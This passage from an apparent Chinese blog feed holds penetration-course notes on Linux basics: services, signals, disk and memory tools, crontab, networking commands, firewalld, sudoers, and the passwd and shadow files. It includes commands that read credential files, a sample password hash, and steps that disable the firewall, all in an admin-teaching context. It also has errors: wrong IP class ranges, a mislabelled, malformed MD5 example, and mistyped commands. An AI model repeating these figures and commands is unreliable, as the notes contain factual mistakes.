src="/../../../../assets/sz2bq1c30ov5kna7_unc00d/1668408800532-c65b9d5e-8abf-4f92-bc34-db6fda345c17.png" alt="image.png"> <a name="PqMmO"></a></p><h3 id="pstree"><a href="#pstree" class="headerlink" title="pstree"></a>pstree</h3><p><code>pstree -p</code><br><code>pstree mysql</code><br><code>pstree -p | grep ssh</code></p><p><a name="nCr8d"></a></p><h2 id="服务管理"><a href="#服务管理" class="headerlink" title="服务管理"></a>服务管理</h2><p>systemctl</p><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>systemctl status * .service</td><td>查看所有服务状态</td></tr><tr><td>systemctl start mysqld.service</td><td>启动服务</td></tr><tr><td>systemctl restart mysqld.service</td><td>重启服务</td></tr><tr><td>systemctl stop mysqld.service</td><td>停止服务</td></tr><tr><td>systemctl enable mysqld.service</td><td>开机启动服务</td></tr><tr><td>systemctl disable mysqld.service</td><td>停止开机启动</td></tr></tbody></table><p><a name="j1On7"></a></p><h3 id="systemctl和service"><a href="#systemctl和service" class="headerlink" title="systemctl和service"></a>systemctl和service</h3><table><thead><tr><th>daemon命令</th><th>systemctl命令</th></tr></thead><tbody><tr><td>service [服务] start</td><td>systemctl start [unit type]</td></tr><tr><td>service [服务] stop</td><td>systemctl stop [unit type]</td></tr><tr><td>service [服务] restart</td><td>systemctl restart [unit type]</td></tr></tbody></table><p><a name="Bn7VN"></a></p><h2 id="停止程序"><a href="#停止程序" class="headerlink" title="停止程序"></a>停止程序</h2><table><thead><tr><th>信号量</th><th>含义</th><th>服务停止</th></tr></thead><tbody><tr><td>0</td><td>EXIT</td><td>程序退出时收到该信息</td></tr><tr><td>1</td><td>HUP</td><td>挂掉电话线或终端连接的挂起信号，这个信号也会造成某些进程在没有终止的情况下重新初始化</td></tr><tr><td>2</td><td>INT</td><td>表示结束进程，但并不是强制性的，常用的”Ctrl+C”组合键发出就是一个kill -2的信号</td></tr><tr><td>3</td><td>QUIT</td><td>退出</td></tr><tr><td>9</td><td>KILL</td><td>杀死进程，即强制结束进程</td></tr><tr><td>11</td><td>SEGV</td><td>段错误</td></tr><tr><td>15</td><td>TERM</td><td>正常结束进程，是kill命令的默认信号</td></tr></tbody></table><p><code>kill -9</code> <a name="ewrNN"></a></p><h1 id="free显示内存的使用情况"><a href="#free显示内存的使用情况" class="headerlink" title="free显示内存的使用情况"></a>free显示内存的使用情况</h1><p><code>free</code>显示内存的使用情况<br><code>free -h</code>可视化<br><code>free -m</code>以单位兆显示<br><img src="/../../../../assets/sz2bq1c30ov5kna7_unc00d/1668412759111-ef739fe3-2bc3-41a5-8859-a9c4e80bdee8.png" alt="image.png"></p><p><a name="BAnsX"></a></p><h1 id="磁盘使用情况"><a href="#磁盘使用情况" class="headerlink" title="磁盘使用情况"></a>磁盘使用情况</h1><p><code>du</code><br>全拼: disk usage</p><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>du /usr</td><td>显示使用情况</td></tr><tr><td>du -h /usr</td><td>–human-readable用恰当的单位</td></tr><tr><td>du -h /root –max-depth=1</td><td>加上层级限制</td></tr><tr><td>du -h –max-depth=1</td><td>sort -hr</td></tr><tr><td>du -ah /root</td><td>sort-hr</td></tr><tr><td>du -ah –exclude=”<em>/.</em>“ .</td><td>排除隐藏目录</td></tr><tr><td>du -kt 10M ./*</td><td>找出10M以上的文件</td></tr></tbody></table><p><a name="el8iA"></a></p><h2 id="综合命令-sar"><a href="#综合命令-sar" class="headerlink" title="综合命令 sar"></a>综合命令 sar</h2><p>全拼: system activity reporter</p><pre><code>[root@xuegod63 ~]# sarLinux 3.10.0-1160.80.1.el7.x86_64 (xuegod63.cn) 2022年11月14日 _x86_64_(4 CPU)09时49分56秒       LINUX RESTART09时50分02秒     CPU     %user     %nice   %system   %iowait    %steal     %idle10时00分01秒     all      0.69      0.12      1.39      0.10      0.00     97.7110时10分01秒     all      0.12      0.00      0.25      0.01      0.00     99.6310时20分01秒     all      0.12      0.00      0.24      0.00      0.00     99.6410时30分01秒     all      0.11      0.00      0.28      0.01      0.00     99.6010时40分01秒     all      0.11      0.00      0.24      0.00      0.00     99.6510时50分01秒     all      0.12      0.00      0.24      0.01      0.00     99.6411时00分01秒     all      0.12      0.00      0.25      0.00      0.00     99.62</code></pre><p><code>%user</code>: 用于表示用户模式下消耗的CPU时间的比例;<br><code>%nice</code>: 通过nice改变了进程调度优先级的进程，在用户模式下消耗的CPU时间的比例;&amp;#x20;<br><code>%system</code>: 系统模式下消耗的CPU时间的比例;<br><code>%iowait</code>: CPU等待磁盘I/O导致空闲状态消耗的时间比例;<br><code>%steal</code>: 利用Xen等操作系统虚拟化技术，等待其它虚拟CPU计算占用的时间比例;<br><code>%idle</code>: CPU空闲时间比例。</p><p><a name="modlG"></a></p><h1 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h1><p>工具: crontab<br>全拼: cron table<br>Cron表达式:<br><a href="https://tool.lu/crontab">https://tool.lu/crontab</a><br><code>cat /etc/crontab</code> <a name="zTgOu"></a></p><h2 id="crontab命令"><a href="#crontab命令" class="headerlink" title="crontab命令"></a>crontab命令</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>crontab -u root -r</td><td>删除任务remove</td></tr><tr><td>crontab -u root time.cron</td><td>把文件添加到某个用户的任务</td></tr><tr><td>crontab -u root -l</td><td>列举任务list</td></tr><tr><td>crontab -u root -e</td><td>编辑任务edit</td></tr></tbody></table><p>示例脚本:&amp;#x20;<br><code>test.cron</code> 输出wuya666<br><code>time.cron</code> 打印时间 <a name="KGhMr"></a></p><h2 id="定时任务文件"><a href="#定时任务文件" class="headerlink" title="定时任务文件"></a>定时任务文件</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>/etc/crontab</td><td>管理文件</td></tr><tr><td>/var/spool/cron/</td><td>每个用户包括root的crontab任务</td></tr><tr><td>/etc/cron.d/</td><td>存放任何要执行的crontab文件或脚本</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时1-11-Linux网络管理</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-11-wang-luo-guan-li/ke-shi-1-11-linux-wang-luo-guan-li/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-11-wang-luo-guan-li/ke-shi-1-11-linux-wang-luo-guan-li/</url>
      
        <content type="html"><![CDATA[<p><a name="laSCY"></a></p><h1 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h1><ol><li>网络基本概念</li><li>网络配置文件</li><li>查看及配置网络</li><li>连通性探测</li><li>查看网络连接</li><li>域名相关</li><li>下载传输 <a name="UZI59"></a></li></ol><h1 id="物理地址-x2F-逻辑地址"><a href="#物理地址-x2F-逻辑地址" class="headerlink" title="物理地址/逻辑地址"></a>物理地址/逻辑地址</h1><ul><li>网卡</li><li>MAC地址(Media Access Control)媒体访问控制</li></ul><p>物理地址；厂家分配</p><ul><li>IP (Internet Protocal Address)互联网协议地址</li></ul><p>逻辑地址；可变；分私有和公有<br>192.168.142.132<br>47.106.11.166 <a name="EnK2X"></a></p><h2 id="公有私有"><a href="#公有私有" class="headerlink" title="公有私有"></a>公有私有</h2><p>局域网——使用私有 IP地址<br>互联网——使用公有 IP地址</p><table><thead><tr><th>公有IP地址的范围</th><th>私有IP地址的范围</th></tr></thead><tbody><tr><td>A类的公有IP:</td><td></td></tr><tr><td>1.0.0.0 - 9.255.255.255</td><td></td></tr><tr><td>11.0.0.0 - 126.255.255.255</td><td>A类私有IP地址:</td></tr><tr><td>10.0.0.0-10.255.255.255</td><td></td></tr><tr><td>B类的公有IP:</td><td></td></tr><tr><td>128.0.0.0-172.15.255.255</td><td></td></tr><tr><td>172.32.0.0-191.255.255.255</td><td>B类私有IP地址:</td></tr><tr><td>172.16.0.0-172.31.255.255</td><td></td></tr><tr><td>C类的公有IP:</td><td></td></tr><tr><td>192.0.0.0-192.168.255.255</td><td></td></tr><tr><td>192.168.0.0-233.255.255.255</td><td>C类私有IP地址:</td></tr><tr><td>192.168.0.0-192.168.255.255</td><td></td></tr></tbody></table><p><a name="Te0uP"></a></p><h2 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h2><p>NAT: Network Address Translation,网络地址转换<br><img src="/../../../../assets/ot9vxkilc1d75ugu_ye6ggz/1668397723880-0514e2a8-ab5f-43dd-940e-73f6eae9e0eb.png" alt="image.png"></p><p><a name="AkRVV"></a></p><h2 id="IPv4、IPv6"><a href="#IPv4、IPv6" class="headerlink" title="IPv4、IPv6"></a>IPv4、IPv6</h2><p><img src="/../../../../assets/ot9vxkilc1d75ugu_ye6ggz/1668398175237-5cb6fc6f-3fb3-4e73-8f03-90285b1e061c.png" alt="image.png"><br><a href="https://tool.520101.com/wangluo/ipjisuan/">https://tool.520101.com/wangluo/ipjisuan/</a></p><p>IPv4: 4个8位二进制，2^32=全部约42亿， 实际可用约25亿 <a name="LMduZ"></a></p><h3 id="公网IP地址的分配"><a href="#公网IP地址的分配" class="headerlink" title="公网IP地址的分配"></a>公网IP地址的分配</h3><p>NIC (Network Information Center)分配<br>ISP (网络业务提供商)、网络基础设施提供商</p><p>全中国一共有多少iP地址?<br><a href="https://www.eet-china.com/mp/a95961.html">https://www.eet-china.com/mp/a95961.html</a></p><p>IPv6是128位的，一共有2的128次方个 <a name="v70By"></a></p><h3 id="动态、静态IP"><a href="#动态、静态IP" class="headerlink" title="动态、静态IP"></a>动态、静态IP</h3><p>DCHP (Dynamic Host Configuration Protocol)动态<br>static静态</p><p><a name="ZR77L"></a></p><h3 id="127-0-0-1"><a href="#127-0-0-1" class="headerlink" title="127.0.0.1"></a>127.0.0.1</h3><p>环回地址(loop back)<br>可以ping通代表网卡安装正常 <a name="o1RaU"></a></p><h2 id="端口port"><a href="#端口port" class="headerlink" title="端口port"></a>端口port</h2><p>作用:区分程序<br>范围: 0-65535<br>系统端口，0到1023<br>用户端口，也称为注册端口，1024-49151<br>动态端口，也称为私有或临时端口，49152-65535 <a name="Z6NxG"></a></p><h2 id="域名Domain-Name"><a href="#域名Domain-Name" class="headerlink" title="域名Domain Name"></a>域名Domain Name</h2><p>作用:替代IP,方便识记<br>域名如何转换为IP: Domain Name System-DNS<br>域名:与IP的数量关系:多对一</p><p>localhost 域名指向环回地址127.0.0.1</p><blockquote><p>--http:// WWW. baidu. com:80 IP Apache<br>https: //WWW. baidu. com: 443<br>http协议的域名可省80，<br>https协议的域名可省443；<br>http:// WWW. baidu. com:8080</p></blockquote><p><a name="uufcp"></a></p><h3 id="Dns服务器地址"><a href="#Dns服务器地址" class="headerlink" title="Dns服务器地址"></a>Dns服务器地址</h3><p>114.114.114.114 国内三大运营商提供<br>8.8.8.8 谷歌公司提供</p><p>例如：<br>fofa.so 域名被封了，但ip不受影响<br>改成fofa.info</p><p><a name="nUdCT"></a></p><h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><p><a href="http://www.baidu.com/">www.baidu.com</a><br>map.baidu.com<br>news.baidu.com</p><p>bss.wuya.com 同一个IP 子目录 /wwwroot/bbs<br>blog.wuya.com 同一个IP 子目录 /wwwroot/blog<br>talk .wuya.com 同一个IP 子目录 /wwwroot/talk</p><p><a name="e6rtS"></a></p><h1 id="网络配置文件"><a href="#网络配置文件" class="headerlink" title="网络配置文件"></a>网络配置文件</h1><table><thead><tr><th>文件</th><th>作用</th></tr></thead><tbody><tr><td>/etc/sysconfig/network-scripts/ifcfg-ens33</td><td>网卡配置文件</td></tr><tr><td>/etc/sysconfig/network-scripts/ifcfg-lo</td><td>环回地址配置文件</td></tr><tr><td>/etc/hosts</td><td>主机名与IP的映射</td></tr><tr><td>/etc/resolv.conf</td><td>DNS配置，由ens33自动覆盖</td></tr></tbody></table><p><a name="ZAcJX"></a></p><h1 id="查看及配置网络"><a href="#查看及配置网络" class="headerlink" title="查看及配置网络"></a>查看及配置网络</h1><p><a name="VXCMW"></a></p><h2 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h2><p>全拼: network interfaces configuring<br>位于net-tools工具包<br>可以动态配置网络参数<br>其他选项参数: <a href="https://www.linuxcool.com/">https://www.linuxcool.com/</a></p><p><a name="D7aMr"></a></p><h2 id="ifconfig和ip"><a href="#ifconfig和ip" class="headerlink" title="ifconfig和ip"></a>ifconfig和ip</h2><p><img src="/../../../../assets/ot9vxkilc1d75ugu_ye6ggz/1668402998435-d63f3f64-51ea-41da-9725-8293a090d92e.png" alt="image.png"></p><p><a name="fP7kM"></a></p><h2 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h2><p>位于iproute工具包<br>添加设备、启动停止网络设备、设置IP、 设置网关……<br>其他选项参数: <a href="https://www.linuxcool.com/">https://www.linuxcool.com/</a></p><p><a name="Y9apQ"></a></p><h1 id="连通性探测"><a href="#连通性探测" class="headerlink" title="连通性探测"></a>连通性探测</h1><p><a name="xYpLE"></a></p><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p>全拼: Packet Internet Groper,因特网包探索器<br>ping baidu.com<br>ping 192.168.142.151 <a name="uZXBt"></a></p><h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><p>远程登录<br>telnet bbs.newsmth.net</p><p>探测端口<br>telnet 192.168.142.132 80<br>telnet 192.168.142.132 22 <a name="aNbUg"></a></p><h1 id="查看网络连接"><a href="#查看网络连接" class="headerlink" title="查看网络连接"></a>查看网络连接</h1><p><a name="Vc71s"></a></p><h2 id="netstat-ss"><a href="#netstat-ss" class="headerlink" title="netstat (ss)"></a>netstat (ss)</h2><p>全拼: network statistics</p><p>查看程序的网络连接情况:<br>netstat -ap | grep ssh</p><p>查看端口的网络连接情况:<br>netstat -ap | grep 3306</p><p><a name="NFwvh"></a></p><h1 id="域名相关"><a href="#域名相关" class="headerlink" title="域名相关"></a>域名相关</h1><p><strong>nslookup</strong><br><code>nslookup baidu.com</code><br>A记录: IP地址<br>CNAME:域名别名<br>MX:邮件服务器</p><p><strong>dig (domain information groper)</strong><br><code>dig baidu.com</code><br><code>dig www.xtu.edu.cn A +noall + answer</code><br><code>dig www.xtu.edu.cn MX + noall + answer</code><br><code>dig www.xtu.edu.cn NS + noall + answer</code></p><p><strong>host</strong><br><code>host baidu.com</code><br><code>host -t MX www.baidu.com</code></p><pre><code>┌──(root㉿guoyx)-[/home/kali]└─# host -t MX www.baidu.comwww.baidu.com is an alias for www.a.shifen.com.</code></pre><p><a name="yD04Y"></a></p><h1 id="下载传输"><a href="#下载传输" class="headerlink" title="下载传输"></a>下载传输</h1><p><a name="uvETu"></a></p><h2 id="常规方式"><a href="#常规方式" class="headerlink" title="常规方式"></a>常规方式</h2><p>Xshell拖曳——上传<br>xftp——双向，或者Filezilla、 FlashFTP<br>sz file name——下载<br>rz——上传<br>vmtools拖动——传入<br>QQ——双向 <a name="jAI0x"></a></p><h2 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h2><blockquote><p>wget <a href="https://download.redis.io/releases/redis-6.0.9.tar.gz">https://download.redis.io/releases/redis-6.0.9.tar.gz</a></p></blockquote><p><code>wget -O</code>改名字</p><blockquote><p>wget -O redis.tar.gz <a href="https://download.redis.io/releases/redis-6.0.9.tar.gz">https://download.redis.io/releases/redis-6.0.9.tar.gz</a></p></blockquote><p><code>wget -c </code>断点续传<br><code>wget -b</code> 后台下载<br><code>wget -i </code>filelist.txt 同时下载多个<br><code>tail -f wget-log</code> 查看下载进度</p><p><a name="SD8bn"></a></p><h2 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h2><p>全拼: Secure Copy<br><code>scp 1.txt root@192.168.142.66:/tmp</code><br><code>scp -r folder root@192.168.142.66:/tmp</code></p><p><a name="RArG6"></a></p><h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><p>全拼: Client URL<br><code>curl https://www.baidu.com &gt; page.html</code><br><code>curl -X POST -d 'a=1&amp;b= nihao' URL</code><br><code>curl -H "Content- Type: application/json" -X POST -d '{" abc":123,"bcd":"nihao"}' URL</code></p><p><a name="l6Syi"></a></p><h1 id="防火墙Firewall"><a href="#防火墙Firewall" class="headerlink" title="防火墙Firewall"></a>防火墙Firewall</h1><p><a name="CQa2j"></a></p><h2 id="iptables工具"><a href="#iptables工具" class="headerlink" title="iptables工具"></a>iptables工具</h2><ul><li>启动防火墙</li></ul><p><code>systemctl start firewalld</code></p><ul><li>查看已开放的端口</li></ul><p><code>firewall-cmd --list-ports</code></p><ul><li>开启80端口</li></ul><p><code>firewall-cmd --zone = public --add-port= 80/tcp --permanent</code></p><ul><li>重启防火墙</li></ul><p><code>firewall-cmd --reload</code></p><ul><li>停止防火墙</li></ul><p><code>systemctl stop firewalld.service</code></p><ul><li>禁止防火墙开机启动</li></ul><p><code>systemctl disable firewalld.service</code></p><ul><li>删除规则</li></ul><p><code>firewall-cmd --zone=public --remove-port= 80/tcp --permanent</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时2-10-sudoers填坑</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-10-yong-hu-guan-li/ke-shi-2-10-sudoers-tian-keng/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-10-yong-hu-guan-li/ke-shi-2-10-sudoers-tian-keng/</url>
      
        <content type="html"><![CDATA[<p><a name="vOgWo"></a></p><h1 id="x2F-etc-x2F-sudoers"><a href="#x2F-etc-x2F-sudoers" class="headerlink" title="/etc/sudoers"></a>/etc/sudoers</h1><p>格式:<br>wuya ALL=(ALL) ALL<br>kali ALL=(ALL) NOPASSWD: /bin/useradd</p><p>全拼: super user do<br><code>sudo -l</code><br><code>sudo</code> command (要执行的命令) <a name="LPyxE"></a></p><h3 id="解决没有编辑sudoers权限"><a href="#解决没有编辑sudoers权限" class="headerlink" title="解决没有编辑sudoers权限"></a>解决没有编辑sudoers权限</h3><p>使用<code>visudo</code>编辑权限</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时1-10-Linux用户和权限管理</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-10-yong-hu-guan-li/ke-shi-1-10-linux-yong-hu-he-quan-xian-guan-li/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-10-yong-hu-guan-li/ke-shi-1-10-linux-yong-hu-he-quan-xian-guan-li/</url>
      
        <content type="html"><![CDATA[<p><a name="DjdiU"></a></p><h1 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h1><ol><li>用户组</li><li>用户</li><li>用户管理相关<strong>文件</strong></li><li>用户管理基本<strong>命令</strong></li><li>文件和目录<strong>归属</strong></li><li>文件和目录<strong>权限</strong> <a name="a0GMV"></a></li></ol><h1 id="用户组Group"><a href="#用户组Group" class="headerlink" title="用户组Group"></a>用户组Group</h1><p><img src="/../../../../assets/lw42v2iewcwx3u9y_gryd5v/1668341373504-8243d500-10ce-4c86-ad2b-67119b3585ff.png" alt="image.png"></p><p><a name="qMj8W"></a></p><h2 id="组ID-Group-ID-GID"><a href="#组ID-Group-ID-GID" class="headerlink" title="组ID-Group ID-GID"></a>组ID-Group ID-GID</h2><ol><li>root用户组: GID=0</li><li>程序用户组(系统用户组) : 1-999 (CentOS7)</li><li>普通用户组: 1000-65535</li></ol><p><code>cat /etc/group</code> <a name="YXBOB"></a></p><h2 id="Group相关命令"><a href="#Group相关命令" class="headerlink" title="Group相关命令"></a>Group相关命令</h2><table><thead><tr><th>操作</th><th>命令</th></tr></thead><tbody><tr><td>查看全部组</td><td>cat /etc/group</td></tr><tr><td>查看用户的所属组</td><td>groups</td></tr><tr><td>添加用户组</td><td>groupadd security</td></tr><tr><td>删除用户组</td><td>groupdel security</td></tr></tbody></table><p><a name="f0Qo5"></a></p><h1 id="用户User"><a href="#用户User" class="headerlink" title="用户User"></a>用户User</h1><p><a name="Yo9ID"></a></p><h2 id="用户ID-User-ID-UID"><a href="#用户ID-User-ID-UID" class="headerlink" title="用户ID-User ID-UID"></a>用户ID-User ID-UID</h2><ol><li>root用户: UID=0 (反之也成立)</li><li>程序用户(系统用户) : 1-999 (CentOS7)</li><li>普通用户: 1000-65535</li></ol><p><code>cat /etc/passwd</code></p><p><a name="fO0hh"></a></p><h2 id="User相关命令"><a href="#User相关命令" class="headerlink" title="User相关命令"></a>User相关命令</h2><table><thead><tr><th>操作</th><th>命令</th></tr></thead><tbody><tr><td>添加用户</td><td>useradd</td></tr><tr><td>修改用户密码</td><td>passwd</td></tr><tr><td>删除用户</td><td>userdel</td></tr><tr><td>修改用户信息</td><td>usermod</td></tr></tbody></table><p><a name="xxCHT"></a></p><h1 id="用户管理相关文件"><a href="#用户管理相关文件" class="headerlink" title="用户管理相关文件"></a>用户管理相关文件</h1><p><a name="VoNwv"></a></p><h2 id="x2F-etc-x2F-group"><a href="#x2F-etc-x2F-group" class="headerlink" title="/etc/group"></a>/etc/group</h2><ol><li>组名</li><li>组密码</li><li>GID</li><li>用户列表</li></ol><p>影子文件:<br><code>cat /etc/gshadow</code><br>组名: 密码: 组管理员: 组附加用户列表</p><blockquote><p><strong>root<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>0:</strong><br><strong>bin<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>l:</strong><br><strong>daemon<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>2:</strong><br><strong>sys<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>3:</strong><br><strong>adm<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>4:</strong><br><strong>tty<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>5:</strong><br><strong>disk<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>6:</strong><br><strong>lp<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>7:</strong><br><strong>mem<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 8:</strong><br><strong>kmem<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>9:</strong><br><strong>wheel :X: 10:</strong><br><strong>cdrom<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>1l:</strong><br><strong>mail:X: 12: postfix</strong></p></blockquote><p><a name="MqEPK"></a></p><h2 id="x2F-etc-x2F-passwd"><a href="#x2F-etc-x2F-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h2><blockquote><p>root : x : 0 : 0 : root : /root : /bin/bash<br>bin<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>1:1:bin:/bin:/sbin/nologin<br>daemon: x:2:2:daemon:/sbin:/sbin/nologin<br>adm<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>3:4:adm:/var/adm: / sbin/nologin<br>lp<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>4:7:lp:/var/spool/lpd:/sbin/nologin<br>sync<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>5:0:sync:/sbin: /bin/sync<br>shutdown<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 6:0:shutdown: /sbin: /sbin/shutdown</p></blockquote><ol><li>用户名</li><li>密码</li><li>UID</li><li>GID</li><li>全名</li><li>home路径</li><li>shell工具</li></ol><p>密码在影子文件：<code>cat /etc/shadow</code> <a name="GSM15"></a></p><h2 id="x2F-etc-x2F-shadow"><a href="#x2F-etc-x2F-shadow" class="headerlink" title="/etc/shadow"></a>/etc/shadow</h2><p>wuya : $1$jX8wc27p$bW2rSGQLDCsX2Hz/uwNK70 : 19157 : 0 : 99999 : 7 : : :<br>WWW : ! ! : 19165 : 0 : 99999 : 7 : : :<br>mysql : !! : 19173 : : : : : :</p><ol><li>用户名</li><li>密码</li><li>最后修改时间(1970年1月1日以后的多少天)</li><li>最小修改间隔时间</li><li>密码有效期</li><li>密码需要变更前的警告天数</li><li>密码过期后的宽限天数</li><li>账号失效时间</li><li>保留 <a name="ZOqEA"></a></li></ol><h3 id="密码格式"><a href="#密码格式" class="headerlink" title="密码格式"></a>密码格式</h3><p>命令: openssl passwd -1 -salt admin 123456<br>格式: $id$salt$encrypted<br>示例: $1 $admin$LCIYcRe.ee8dQwgrFc5nz.</p><table><thead><tr><th>数字</th><th>加密方式</th></tr></thead><tbody><tr><td>1</td><td>MD5</td></tr><tr><td>2a</td><td>Blowfish (某些Linux发行版)</td></tr><tr><td>5</td><td>SHA-256</td></tr><tr><td>6</td><td>SHA-512</td></tr></tbody></table><blockquote><p>加密方式MD5 单向 哈希算法(摘要算法)<br>12345 : 6e10adc3949ba59abbe56e057f20f883e<br>abcdef : 7ac66c0f148de9519b8bd264312c4d64</p><p>123456 + “wuya”<br>12wuya3456              salt 盐</p><p>81ca647915e06f3826abece86d3246d0</p></blockquote><p><a name="sR7kI"></a></p><h2 id="etc-x2F-sudoers"><a href="#etc-x2F-sudoers" class="headerlink" title="etc/sudoers"></a>etc/sudoers</h2><p>格式:<br>wuya ALL=(ALL) ALL<br>kali ALL=(ALL) NOPASSWD: /bin/useradd</p><p>全拼: super user do<br><code>sudo -l</code><br>sudo command (要执行的命令)</p><p><a name="LPyxE"></a></p><h3 id="解决没有编辑sudoers权限"><a href="#解决没有编辑sudoers权限" class="headerlink" title="解决没有编辑sudoers权限"></a>解决没有编辑sudoers权限</h3><p>使用<code>visudo</code>编辑权限 <a name="ae7mq"></a></p><h1 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h1><table><thead><tr><th>操作</th><th>命令</th></tr></thead><tbody><tr><td>查询用户账号身份标识</td><td>id</td></tr><tr><td>查询用户账号的登录属性</td><td>finger</td></tr><tr><td>查询当前主机的用户登录情况</td><td>w、who</td></tr><tr><td>查询系统当前在线的用户</td><td>users</td></tr><tr><td>查看用户</td><td>whoami</td></tr><tr><td>切换用户</td><td>su</td></tr></tbody></table><p><a name="W1MA7"></a></p><h1 id="用户和文件的关系"><a href="#用户和文件的关系" class="headerlink" title="用户和文件的关系"></a>用户和文件的关系</h1><p>文件所有者:所属用户、所属组<br>访问权限: 读、写、执行</p><p><a name="v0OCA"></a></p><h2 id="文件和目录归属"><a href="#文件和目录归属" class="headerlink" title="文件和目录归属"></a>文件和目录归属</h2><p>文件的拥有者<br>文件的所属组<br>全拼: change owner<br><code>chown -R wuya /usr/local/soft</code><br><code>chown -R redis:redis /usr/local/soft/redis</code> <a name="TU5md"></a></p><h2 id="文件和目录权限"><a href="#文件和目录权限" class="headerlink" title="文件和目录权限"></a>文件和目录权限</h2><table><thead><tr><th>-</th><th>rw- — —.</th><th>1</th><th>root</th><th>root</th><th>2750 Jun 14 14:53</th><th>anaconda-ks.cfg</th></tr></thead><tbody><tr><td>d</td><td>rwx r-x r-x.</td><td>2</td><td>root</td><td>root</td><td>6 Jun  14 06:55</td><td>Desktop</td></tr></tbody></table><p><a name="XQOnI"></a></p><h3 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h3><blockquote><ul><li></li></ul><p>d</p></blockquote><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td>d</td><td>目录文件(文件夹)</td></tr><tr><td>-</td><td>普通文件</td></tr><tr><td>l</td><td>软链接. 